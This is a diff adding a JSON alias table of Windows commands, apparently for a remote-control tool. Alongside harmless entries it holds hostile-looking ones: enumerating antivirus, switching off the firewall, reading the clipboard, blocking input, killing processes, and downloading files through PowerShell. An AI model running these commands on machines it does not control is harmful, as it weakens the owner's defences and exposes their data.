@@ -1,0 +1,19 @@
+{
+  "drive": "wmic logicaldisk get caption,description",
+  "enumav": "wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName",
+  "freeze": "pyexec import ctypes;ctypes.windll.user32.BlockInput()",
+  "getclip": "pyexec import pyperclip;print(pyperclip.paste())",
+  "killfw": "netsh advfirewall set allprofiles state off",
+  "lockscreen": "rundll32.exe user32.dll,LockWorkStation",
+  "openurl": "pyexec import webbrowser;webbrowser.open('<url>')",
+  "pkill": "wmic process where name='<process name>' call terminate",
+  "resume": "pyexec import psutil;p=psutil.Process(<pid>);p.resume()",
+  "search": "where /r <path> <filename>",
+  "sendkey": "pyexec import pyautogui;pyautogui.press('<key>')",
+  "setbrt": "powershell.exe (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,<brightness>)",
+  "setclip": "pyexec import pyperclip;pyperclip.copy('<text>')",
+  "showdesktop": "powershell.exe (New-Object -ComObject shell.application).toggleDesktop()",
+  "suspend": "pyexec import psutil;p=psutil.Process(<pid>);p.suspend()",
+  "touch": "type nul > <filename>",
+  "wget": "powershell.exe (New-Object System.Net.WebClient).DownloadFile('<url>', '<filename>')"
+}
